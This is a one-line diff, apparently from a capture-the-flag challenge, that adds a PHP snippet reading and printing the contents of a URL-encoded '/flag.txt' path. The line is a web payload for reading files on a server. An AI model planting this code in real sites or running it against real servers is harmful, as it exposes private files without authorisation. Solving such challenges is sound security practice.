@@ -1,0 +1,1 @@
+<?php echo file_get_contents('%2Fflag%2Etxt'); ?>
